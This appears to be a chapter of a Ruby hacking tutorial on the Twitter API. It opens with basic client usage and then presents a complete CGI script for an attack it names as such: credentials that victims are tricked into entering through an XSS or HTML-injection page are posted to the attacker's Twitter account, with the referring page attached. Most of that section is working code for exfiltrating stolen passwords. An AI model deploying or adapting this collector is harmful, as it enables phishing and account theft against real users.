# Twitter API
Dealing with twitter API's s really useful due information gathering, taxonomy and social engineering. However, you have to have some keys and tokens in-order to interact with twitter APIs. To do so, please refer to the official [twitter development page][1].

- To install twitter API
```
gem install twitter
```

## Basic Usage
**rubyfu-tweet.rb**
```ruby
#!/usr/bin/env ruby
# KING SABRI | @KINGSABRI
#
require 'twitter'
require 'pp'

client = Twitter::REST::Client.new do |config|
        config.consumer_key        = "YOUR_CONSUMER_KEY"
        config.consumer_secret     = "YOUR_CONSUMER_SECRET"
        config.access_token        = "YOUR_ACCESS_TOKEN"
        config.access_token_secret = "YOUR_ACCESS_SECRET"
end

puts client.user("Rubyfu")                   # Fetch a user
puts client.update("@Rubyfu w00t! #Rubyfu")  # Tweet (as the authenticated user)
puts client.follow("Rubyfu")                 # Follow User (as the authenticated user)
puts client.followers("Rubyfu")              # Fetch followers of a user
puts client.followers                        # Fetch followers of current user 
puts client.status(649235138585366528)       # Fetch a particular Tweet by ID
puts client.create_direct_message("Rubyfu", "Hi, I'm KINGSABRI")    # Send direct message to a particular user
```
![](webfu__twitterAPI1.png)


**Your turn**, tweet to @Rubyfu using above example, no cheating ;).

## Building Stolen Credentials notification bot
We're exploiting an XSS/HTML injection vulnerability and tricking users to enter there Username and Password. The idea is, We'll make a [CGI script][2] that takes that stolen credentials then tweet these credentials to us as notification or log system
```ruby
#!/usr/bin/ruby -w                                                                 

require 'cgi'
require 'uri'
require 'twitter'

cgi  = CGI.new
puts cgi.header

user = CGI.escape cgi['user']
pass = CGI.escape cgi['pass']
time = Time.now.strftime("%D %T")

client = Twitter::REST::Client.new do |config|
        config.consumer_key        = "YOUR_CONSUMER_KEY"
        config.consumer_secret     = "YOUR_CONSUMER_SECRET"
        config.access_token        = "YOUR_ACCESS_TOKEN"
        config.access_token_secret = "YOUR_ACCESS_SECRET"
end
client.user("KINGSABRI")

if cgi.referer.nil? or cgi.referer.empty?
    # Twitter notification | WARNING! It's tweets, make sure your account is protected!!!
    client.update("[Info] No Refere!\n" + "#{CGI.unescape user}:#{CGI.unescape pass}")
else
    client.update("[Info] #{cgi.referer}\n #{CGI.unescape user}:#{CGI.unescape pass}")
end

puts ""
```






[1]: https://dev.twitter.com/oauth/overview
[2]: http://rubyfu.net/content/module_0x4__web_kungfu/index.html#cgi
